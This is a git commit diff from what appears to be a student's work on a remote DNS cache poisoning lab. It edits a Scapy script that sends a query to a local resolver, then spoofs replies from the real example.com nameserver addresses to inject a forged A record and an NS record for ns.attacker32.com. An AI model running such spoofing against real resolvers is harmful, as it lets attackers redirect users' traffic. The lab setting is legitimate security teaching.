d55163a19700bbc351c1bf19ab9c9c8f190d61ae
Ana Barros <up201806593@fe.up.pt>
2022-05-07 11:58:16 -0400

    Task 3

--- DNS_Remote/Labsetup/volumes/3.py
+++ DNS_Remote/Labsetup/volumes/3.py
@@ -2,18 +2,14 @@
 from scapy.all import * 
 import random, string
 
-def randomword(length):
-   letters = string.ascii_lowercase
-   return ''.join(random.choice(letters) for i in range(length))
-
 attackerIP = "10.9.0.1"
 apoloIP = "10.9.0.53"
-#nsIP = ??
+nsIPs = ["199.43.133.53", "199.43.135.53"]
 
 domain = 'example.com'
-name = randomword(5) + '.' + domain 
+name = 'www.example.com'
+ns = 'ns.attacker32.com'
 port = RandShort()
-ns = '1.2.3.4'
 
 # Send request
 Qdsec = DNSQR(qname=name)
@@ -25,11 +21,13 @@ request = ip/udp/dns
 send(request)
 
 # Send answers 
-Qdsec = DNSQR(qname=name)
-Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
-NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
-dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
-    qd=Qdsec, an=Anssec, ns=NSsec)
-ip = IP(dst=apoloIP, src='+++')
-udp = UDP(dport='', sport='+++', chksum=0)
-reply = ip/udp/dns
+for ipns in nsIPs:
+    Qdsec = DNSQR(qname=name)
+    Anssec = DNSRR(rrname=name, type='A', rdata="1.2.3.5", ttl=259200)
+    NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
+    dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
+        qd=Qdsec, an=Anssec, ns=NSsec)
+    ip = IP(dst=apoloIP, src=ipns)
+    udp = UDP(dport=33333, sport=53, chksum=0)
+    reply = ip/udp/dns
+    send(reply)
